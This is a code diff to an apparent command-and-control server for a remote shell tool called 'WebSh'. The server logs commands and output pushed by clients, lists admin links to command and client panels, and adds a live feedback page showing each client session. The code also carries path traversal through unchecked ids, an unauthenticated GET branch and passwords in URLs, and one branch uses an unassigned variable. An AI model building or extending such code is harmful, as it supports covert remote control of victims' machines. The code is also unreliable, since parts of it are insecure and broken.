@@ -130,9 +130,6 @@ def get_cmd():
 @app.route("/push_command/")
 def push_command():
     if request.args.get('id') and request.args.get('data') and request.args.get('command'):
-        if request.args.get('id') not in glob.glob("./data/*.*"):
-            with open("./data/"+request.args.get('id'),'w') as file:
-                file.write("")
         with open(f"./data/{request.args.get('id')}",'a') as file:
             file.write(f"WebSh-{request.args.get('id')}-$ {request.args.get('command')}\n{request.args.get('data')}\n\n")
         return "Done !"
@@ -177,12 +174,39 @@ def account():
         password = request.values.get('password')
         if hash(password,user)==admin_hash and user == admin_usr:
             fail_counter = 0
-            return f"<h1 style='text-align:center;'>Admin links</h1><strong>Command Pannel :</strong><p>http://{host1}/command/{admin_token}?password={admin_password}</p>"+f"<strong>Clients Pannel :</strong><p>http://{host1}/get_all_clients/{admin_token}?password={admin_password}</p>"
+            return f"<h1 style='text-align:center;'>Admin links</h1><strong>Command Pannel :</strong><p>http://{host1}/command/{admin_token}?password={admin_password}</p>"+f"<strong>Clients Pannel :</strong><p>http://{host1}/get_all_clients/{admin_token}?password={admin_password}</p><strong>Live Feedback :</strong><p>http://{host1}/feedback/{admin_token}?password={admin_password}</p>"
         else:
             fail_counter+=1
             return render_template("admin.html",error_code=f"Access Refused : {fail_counter}/3 attempts.")
     else:
         return render_template("admin.html")
+
+@app.route("/feedback/"+admin_token,methods=["GET","POST"])
+def feedback():
+    if request.method=="POST":
+        if request.args.get('password'):
+            if request.args.get('id'):
+                with open(f"./data/{id}",'r') as file:
+                    data = file.read()
+                return render_template("feedback.html",content=data)
+            if request.args.get('password') == admin_password:
+                id = request.values.get('id')
+                try:
+                    with open(f"./data/{id}",'r') as file:
+                        data = file.read()
+                except:
+                    return render_template("feedback.html",error="Innexistant session, send a command first.")
+                return render_template("feedback.html",content=data,url="/feedback/"+admin_token+f"?password={admin_password}&id={id}")
+            else:
+                return render_template("feedback.html",error="Wrong Password")
+        return render_template("feedback.html",error="Please Set a Password")
+    else:
+        if request.args.get('id'):
+            with open(f"./data/{request.args.get('id')}",'r') as file:
+                data = file.read()
+            return render_template("feedback.html",content=data,url="/feedback/"+admin_token+f"?password={admin_password}&id={request.args.get('id')}")
+        else:
+            return render_template("feedback.html")
 
 
 @app.route("/command/"+admin_token,methods=["GET","POST"])
